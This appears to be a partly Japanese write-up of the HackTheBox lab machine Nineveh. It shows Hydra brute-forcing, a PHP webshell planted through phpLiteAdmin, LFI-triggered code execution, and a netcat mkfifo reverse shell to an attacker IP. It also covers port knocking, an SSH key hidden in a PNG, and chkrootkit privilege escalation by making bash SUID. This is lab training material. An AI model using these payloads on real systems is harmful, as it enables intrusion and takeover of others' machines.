+++
title = "HackTheBox - Nineveh Writeup"
date = "2026-04-20"
description = "phpLiteAdmin RCE + LFI + Port Knocking + chkrootkit privesc"
tags = ["HackTheBox", "CTF", "Linux", "LFI", "RCE", "PortKnocking", "chkrootkit", "Hydra", "Medium"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details                     |
|------------|-----------------------------|
| Machine    | Nineveh                     |
| OS         | Ubuntu 16.04.2 LTS          |
| IP         | 10.10.10.43                 |
| Difficulty | Medium                      |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.21.145
```

```text
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
```

---

## Web Fuzzing

### HTTP (Port 80)

```bash
gobuster dir -u http://10.129.21.145/ -w /usr/share/wordlists/dirb/common.txt
```

```text
index.html  (Status: 200)
info.php    (Status: 200)
```

```bash
gobuster dir -u http://10.129.21.145/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

```text
department  (Status: 301) --> http://10.129.21.145/department/
```

### HTTPS (Port 443)

```bash
gobuster dir -u https://nineveh.htb/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

```text
db            (Status: 301) --> https://nineveh.htb/db/
secure_notes  (Status: 301) --> https://nineveh.htb/secure_notes/
```

発見したエンドポイント:
- `http://nineveh.htb/department/login.php` — ログインフォーム (SQLi 不可)
- `https://nineveh.htb/db/` — phpLiteAdmin v1.9
- `https://nineveh.htb/secure_notes/` — nineveh.png が1枚だけ存在

---

## Brute Force

### /db — phpLiteAdmin (HTTPS)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form \
  '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password'
```

```text
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```

### /department — Login Form (HTTP)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form \
  '/department/login.php:username=^USER^&password=^PASS^:Invalid Password'
```

```text
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
```

---

## Payload Generation

phpLiteAdmin (`https://nineveh.htb/db/`) にログイン後、PHP webshell をデータベースファイルとして作成する。

1. データベース名: `nineveh.php` で作成
2. テーブル名: `cmd` / Fields: `1` で作成
3. フィールド設定:

| 項目          | 値                                  |
|---------------|-------------------------------------|
| Field name    | cmd                                 |
| Type          | TEXT                                |
| Default Value | `<?php system($_GET["cmd"]); ?>`    |

```text
Path to database: /var/tmp/nineveh.php
```

---

## Trigger

LFI を利用して `/var/tmp/nineveh.php` を include し RCE を確認する。

```text
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/nineveh.php&cmd=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Listener

```bash
nc -lvnp 4444
```

---

## Upload / Delivery

ブラウザから以下の URL にアクセスしてリバースシェルを送信する。

```text
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/nineveh.php&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+10.10.16.166+4444+>/tmp/f
```

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.21.255] 54818
/bin/sh: 0: can't access tty; job control turned off
$
```

---

## Foothold

```bash
whoami
```

```text
www-data
```

---

## System Info

```bash
uname -a
```

```text
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 GNU/Linux
```

---

## Post Exploitation

### Port Knocking の発見

```bash
ps aux | grep knock
```

```text
root  1325  /usr/sbin/knockd -d -i ens160
```

```bash
cat /etc/knockd.conf
```

```text
[openSSH]
 sequence = 571, 290, 911
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

### SSH 秘密鍵の発見 (Steganography)

```bash
strings /var/www/ssl/secure_notes/nineveh.png
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
...
-----END RSA PRIVATE KEY-----
```

---

## Results

- Port Knocking シーケンス: `571 → 290 → 911`
- SSH 秘密鍵が PNG ファイルに埋め込まれていた
- SSH ユーザー: `amrois`
- chkrootkit が root 権限で cron 実行されている (CVE-2014-0476)

---

## SSH Access

```bash
knock 10.129.21.255 571 290 911 && nmap -p 22 10.129.21.255
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

```bash
nano id_rsa
chmod 600 id_rsa
knock nineveh.htb 571 290 911 && ssh -i id_rsa amrois@10.129.21.255
```

---

## Privilege Escalation

### chkrootkit CVE-2014-0476

```bash
echo "chmod +s /bin/bash" > /tmp/update
chmod +x /tmp/update
```

```bash
ls -la /bin/bash
```

```text
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

---

## Root Shell

```bash
/bin/bash -p
```

```text
bash-4.3#
```

---

## Flags

### User

```bash
cat /home/amrois/user.txt
```

### Root

```bash
cat /root/root.txt
```

---

## Summary

Hydra で phpLiteAdmin と department ログインを突破 → phpLiteAdmin に PHP webshell を埋め込み → LFI で RCE → www-data シェル取得 → knockd.conf からポートノッキングシーケンスを発見 → PNG ステガノグラフィから SSH 秘密鍵を取得 → amrois でログイン → chkrootkit CVE-2014-0476 で root 昇格
